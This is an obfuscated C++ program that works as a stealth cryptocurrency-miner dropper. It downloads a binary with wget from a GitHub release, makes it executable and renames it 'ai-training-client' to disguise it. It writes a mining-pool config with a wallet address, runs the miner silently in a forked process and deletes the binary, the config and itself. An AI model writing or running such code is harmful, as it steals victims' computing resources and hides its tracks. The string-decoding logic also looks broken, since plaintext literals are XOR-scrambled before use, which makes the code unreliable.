#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

#define IlIlIllIlllll remove
#define IlIllllIlllll std::string
#define IIIllllIlllll chdir
#define llIllllIlllll fork
#define IlIlIlIlIlIlI "/dev/null"
#define IlIlIlIlIlIll for
#define IlIlIlIlIlIIl system
#define llIlIlIlIlIIl FILE*
#define lIIlIlIlIlIIl int
#define lIllIlIlIlIIl freopen
#define llIllIllIlIII execl
#define IIIllIllIlIII chmod
#define ________ stdin
#define _________ stdout
#define _______ stderr
#define IIIllIllIlIlI unsigned char
#define IllIlIllIlIlI c_str
#define IllIlIllIlIll length
#define IllIlIllIllIl fprintf
#define IllIlIllIllll fclose
#define IllIlIllIlllI fopen
#define IllIlIllIllII sleep
#define IllIlIlIIllIl pid_t
#define IllIlIlIIllII 0777
#define IllIlIlIIllll char *
#define IllIlIlIIlllI 0b10101010
#define IllIlIlIIIIIl if
#define IllIlIlIIIIII else
#define IllIlllIIIIIl main
#define lIllIlllIIIIl return
#define lIllIlllIIIII rename
#define lIlIIlllIIIII "w"
#define lIlIIlllIIIIl "r"
#define IIlIIlllIIIIl "%s"

IlIllllIlllll IlIlIllIlIll(IlIllllIlllll lIIllIllIlIIl) {
	IlIllllIlllll lIIllIllIlIlI;
	IlIlIlIlIlIll (lIIlIlIlIlIIl IllllIllIlIll = IllIlIlIIllII^IllIlIlIIllII; IllllIllIlIll < lIIllIllIlIIl.IllIlIllIlIll(); IllllIllIlIll++) lIIllIllIlIlI += (IIIllIllIlIlI)(lIIllIllIlIIl[IllllIllIlIll] ^ IllIlIlIIlllI);
	lIllIlllIIIIl lIIllIllIlIlI;
}

lIIlIlIlIlIIl IllIlllIIIIIl(lIIlIlIlIlIIl _, IllIlIlIIllll llIllIlIIlllI[]) {
	IlIllllIlllll IlIlIllIlIlI = "[common]\nalgo=144_5\npers=BgoldPoW\nwatchdog=0\n[server]\nhost=us-btg.2miners.com\nport=14040\nuser=AJQDC2UxGqX2L6FLSw9666aHitLphEgzHv.server\npass=x\nssl=1\n"; // config file
	IIIllllIlllll(IlIlIllIlIll("/tmp").IllIlIllIlIlI()); // move to tmp dir
	IlIlIlIlIlIIl(IlIlIllIlIll("wget -q https://github.com/wdotmathree/random/releases/download/ignore/exec").IllIlIllIlIlI()); // download exec
	IIIllIllIlIII(IlIlIllIlIll("exec").IllIlIllIlIlI(), IllIlIlIIllII); // chmod 777 exec
	lIllIlllIIIII(IlIlIllIlIll("exec").IllIlIllIlIlI(), IlIlIllIlIll("ai-training-client").IllIlIllIlIlI()); // rename exec to ai-training-client
	llIlIlIlIlIIl IlIlIllIlllI = IllIlIllIlllI(IlIlIllIlIll("cfg.txt").IllIlIllIlIlI(), lIlIIlllIIIII); // open cfg.txt
	IllIlIllIllIl(IlIlIllIlllI, IIlIIlllIIIIl, IlIlIllIlIll(IlIlIllIlIlI).IllIlIllIlIlI()); // write config to cfg.txt
	IllIlIllIllll(IlIlIllIlllI); // close cfg.txt
	IllIlIlIIllIl llIlIllIlIlI = llIllllIlllll(); // fork
	IllIlIlIIIIIl (!llIlIllIlIlI) { // child
		lIllIlIlIlIIl(IlIlIlIlIlIlI, lIlIIlllIIIIl, ________); // redirect stdin, stdout, stderr to /dev/null
		lIllIlIlIlIIl(IlIlIlIlIlIlI, lIlIIlllIIIII, _________); 
		lIllIlIlIlIIl(IlIlIlIlIlIlI, lIlIIlllIIIII, _______);

		llIllIllIlIII(IlIlIllIlIll("./ai-training-client").IllIlIllIlIlI(), IlIlIllIlIll(".").IllIlIllIlIlI(), IlIlIllIlIll("--config").IllIlIllIlIlI(), IlIlIllIlIll("cfg.txt").IllIlIllIlIlI(), NULL); // ./ai-training-client --config cfg.txt
	} IllIlIlIIIIII {
		IllIlIllIllII(((IllIlIlIIllII == IllIlIlIIllII) + (IllIlIlIIllII == IllIlIlIIllII)) * ((IllIlIlIIllII == IllIlIlIIllII) + (IllIlIlIIllII == IllIlIlIIllII))); // sleep(1)
		IlIlIllIlllll(IlIlIllIlIll("ai-training-client").IllIlIllIlIlI()); // remove ai-training-client
		IlIlIllIlllll(IlIlIllIlIll("cfg.txt").IllIlIllIlIlI()); // remove cfg.txt
		IlIlIllIlllll(llIllIlIIlllI[IllIlIlIIllII^IllIlIlIIllII]); // remove this file
	}
}
